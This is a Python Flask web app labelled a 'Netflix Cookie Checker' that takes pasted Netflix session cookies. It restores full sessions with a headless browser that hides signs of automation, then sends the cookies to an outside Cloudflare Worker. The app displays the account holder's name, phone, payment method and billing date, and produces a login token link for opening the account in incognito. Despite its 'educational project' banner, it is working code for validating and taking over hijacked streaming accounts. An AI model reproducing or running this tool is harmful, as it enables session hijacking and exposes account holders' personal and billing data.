import requests
from playwright.sync_api import sync_playwright
import json
from flask import Flask, request, render_template_string

app = Flask(__name__)

# Your Worker URL
WORKER_URL = 'https://nfcookietool.pritongtinolaaa.workers.dev/'

# Japanese plan translation
PLAN_TRANSLATION = {
    'プレミアム': 'Premium',
    'スタンダード': 'Standard',
    'ベーシック': 'Basic'
}

def parse_cookies(cookie_str):
    cookies = {}
    for part in cookie_str.split(';'):
        part = part.strip()
        if not part or '=' not in part: continue
        name, value = part.split('=', 1)
        cookies[name.strip()] = value.strip()
    return cookies

def recover_full_cookies(partial_cookie_str):
    output = []
    output.append("\nPartial cookies detected. Recovering full set... (may take 20-90 seconds)")
    try:
        with sync_playwright() as p:
            # Use iPhone UA to better match worker headers and reduce detection
            browser = p.chromium.launch(headless=True, args=[
                '--disable-blink-features=AutomationControlled',
                '--no-sandbox',
                '--disable-infobars',
                '--window-size=1920,1080'
            ])
            context = browser.new_context(
                viewport={'width': 1920, 'height': 1080},
                user_agent='Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1',
                locale='en-US',
                timezone_id='Asia/Manila'
            )
            context.add_init_script("""
                Object.defineProperty(navigator, 'webdriver', { get: () => false });
                Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
                Object.defineProperty(navigator, 'plugins', { get: () => [1,2,3,4,5] });
                window.chrome = { runtime: {} };
                navigator.permissions.query = (parameters) => Promise.resolve({ state: 'granted' });
            """)
            page = context.new_page()
            cookies = []
            parsed = parse_cookies(partial_cookie_str)
            for name, value in parsed.items():
                cookies.append({
                    'name': name,
                    'value': value,
                    'domain': '.netflix.com',
                    'path': '/',
                    'secure': True,
                    'httpOnly': True,
                    'sameSite': 'None'  # Critical for cross-site Netflix cookies
                })
            context.add_cookies(cookies)
            try:
                page.goto('https://www.netflix.com/browse', timeout=90000, wait_until='networkidle')
                page.wait_for_timeout(20000)  # Give more time for cookies to set
            except Exception as e:
                output.append(f"Visit failed: {str(e)}")
            full_cookies = context.cookies('https://www.netflix.com')
            # Log full recovered cookies for debugging
            output.append("Recovered cookies (JSON):")
            output.append(json.dumps(full_cookies, indent=2))
            browser.close()
            if not full_cookies:
                output.append("No additional cookies recovered.")
                return partial_cookie_str, "\n".join(output)
            full_str = '; '.join([f"{c['name']}={c['value']}" for c in full_cookies])
            output.append("Full cookies recovered!")
            output.append("Recovered keys: " + ', '.join([c['name'] for c in full_cookies]))
            return full_str, "\n".join(output)
    except Exception as e:
        output.append(f"Recovery error: {str(e)}")
        return partial_cookie_str, "\n".join(output)

def process_cookie(cookies_input):
    output = ["Processing..."]
    cookies_dict = parse_cookies(cookies_input)
    needs_recovery = 'NetflixId' in cookies_dict and ('SecureNetflixId' not in cookies_dict or 'nfvdid' not in cookies_dict)
    recovery_log = ""
    if needs_recovery:
        cookies_input, recovery_log = recover_full_cookies(cookies_input)
        if recovery_log:
            output.append(recovery_log)
    output.append("\nSending to Worker...")
    headers = {
        'accept': '*/*',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1',
    }
    try:
        r = requests.post(
            WORKER_URL,
            headers=headers,
            json={'cookies': cookies_input},
            timeout=45
        )
        output.append(f"Status: {r.status_code}\n")
        data = r.json()
        output.append("Raw Worker Response:")
        output.append(json.dumps(data, indent=2))
        output.append("-" * 80)
        if data.get("status") in ["live", "partial"] and "account_info" in data:
            info = data["account_info"]
            original_plan = info.get('plan_name', 'Unknown')
            translated_plan = PLAN_TRANSLATION.get(original_plan, original_plan)
            # Clean garbage values
            member_since = info.get("member_since", 'Unknown')
            if isinstance(member_since, (int, str)) and str(member_since).isdigit():
                year = int(member_since)
                if year < 2000 or year > 2026:
                    info["member_since"] = 'Unknown'
            if "al (detected)" in str(info.get("country", "")) or len(str(info.get("country", ""))) < 3:
                info["country"] = 'Unknown'
            output.append("── 👤 PROFILE ──────────")
            output.append(f"│ 👤 Name: {info.get('profile_name', 'Unknown')}")
            output.append(f"│ 📱 Phone: {info.get('phone', 'Not visible')}")
            output.append(f"│ 📅 Member Since: {info.get('member_since', 'Unknown')}")
            output.append(f"│ 🌍 Country: {info.get('country', 'Unknown')}")
            output.append("└──────────────────────")
            output.append("┌── 📺 PLAN INFO ────────")
            output.append(f"│ 📺 Plan: {translated_plan}")
            output.append(f"│ 👥 Max Streams: {info.get('max_streams', 'Unknown')}")
            output.append(f"│ 🎬 Quality: {info.get('quality', 'Unknown')}")
            output.append(f"│ 💰 Price: {info.get('price', 'Unknown')}")
            output.append("└──────────────────────")
            output.append("┌── 💳 BILLING ──────────")
            output.append(f"│ 💳 Payment: {info.get('payment_method', 'CC / Unknown')}")
            output.append(f"│ 📅 Next Bill: {info.get('next_bill_date', 'Unknown')}")
            output.append(f"│ 👥 Extra Member: {info.get('extra_member', 'false')}")
            output.append("└──────────────────────")
            if data.get("nftoken_link"):
                output.append("\nNFToken Link (open in incognito):")
                output.append(data["nftoken_link"])
            if info.get("plan_name") == "Unknown" or info.get("country") == "Unknown":
                output.append("\nNote: Some details could not be scraped automatically (Netflix blocks bots).")
                output.append("Open the NFToken link above in a real browser (incognito) to view everything manually.")
        else:
            output.append("No valid token or account info returned.")
            output.append("Worker message:")
            output.append(data.get("error", data.get("message", "Unknown error")))
    except Exception as e:
        output.append("Error:")
        output.append(str(e))
    output.append("\nDone.")
    return "\n".join(output)

@app.route('/', methods=['GET', 'POST'])
def home():
    result = ""
    if request.method == 'POST':
        cookies_input = request.form.get('cookies', '').strip()
        if cookies_input:
            result = process_cookie(cookies_input)
        else:
            result = "Please paste at least a NetflixId cookie!"

    html = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Netflix Cookie Checker by Schiro</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 900px; margin: 30px auto; padding: 20px; line-height: 1.5; }
            h1 { color: #e50914; text-align: center; }
            .disclaimer { background: #fff3cd; padding: 15px; border-radius: 8px; margin-bottom: 20px; color: #856404; }
            textarea { width: 100%; height: 180px; font-family: monospace; padding: 10px; border: 1px solid #ccc; border-radius: 4px; }
            button { background: #e50914; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
            button:hover { background: #b20710; }
            pre { background: #f8f9fa; padding: 15px; border: 1px solid #ddd; border-radius: 6px; white-space: pre-wrap; overflow-x: auto; font-size: 14px; }
            .note { color: #666; font-size: 0.9em; margin-top: 20px; }
        </style>
    </head>
    <body>
        <h1>Netflix Cookie Checker</h1>
        <div class="disclaimer">
            <strong>Educational project only – School portfolio demo.</strong><br>
            <strong>Note:</strong> Recovery for partial cookies (NetflixId only) may take 1-2 minutes and can fail due to Netflix bot detection.
        </div>
        
        <form method="POST">
            <p>Paste your Netflix cookie string here (NetflixId only or full semi-colon separated):</p>
            <textarea name="cookies" placeholder="NetflixId=v%3D2%26ct%3DBQAOAAEB... (or full cookie string)"></textarea>
            <br><br>
            <button type="submit">Check Cookie</button>
        </form>
        
        {% if result %}
        <h3 style="margin-top: 30px;">Result:</h3>
        <pre>{{ result }}</pre>
        {% endif %}
        
        <div class="note">
            Tip: For best results, try full cookies from Cookie-Editor first. If partial → dead, check logs for recovered keys/flags.
        </div>
    </body>
    </html>
    '''
    return render_template_string(html, result=result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
